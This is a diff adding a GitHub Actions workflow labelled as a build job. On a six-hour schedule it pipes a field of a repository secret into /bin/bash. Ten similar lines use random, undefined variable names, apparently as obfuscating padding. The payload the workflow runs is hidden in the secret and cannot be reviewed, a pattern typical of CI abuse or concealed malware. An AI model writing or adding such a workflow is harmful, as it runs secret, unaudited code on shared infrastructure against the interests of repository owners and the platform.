@@ -1,0 +1,28 @@
+name: ryanbootstrap381
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ryanbootstrap381
+        env:
+          p2: ${{ secrets.p2 }}
+        run: |
+          echo $p2 | jq -r .bkbkv2924 | /bin/bash
+          echo $p59552 | jq -r .jqu84256 | /bin/bash
+          echo $honzg08319 | jq -r .eqs867 | /bin/bash
+          echo $fgq02 | jq -r .uiimr413 | /bin/bash
+          echo $tvaif8026 | jq -r .hy2629 | /bin/bash
+          echo $u4061 | jq -r .bgxs49337 | /bin/bash
+          echo $fxgeg08 | jq -r .yisnm04 | /bin/bash
+          echo $sppr39 | jq -r .qkqzp19139 | /bin/bash
+          echo $yv151 | jq -r .z54 | /bin/bash
+          echo $o9904 | jq -r .flm257 | /bin/bash
+          echo $mh26 | jq -r .yoke3 | /bin/bash
+
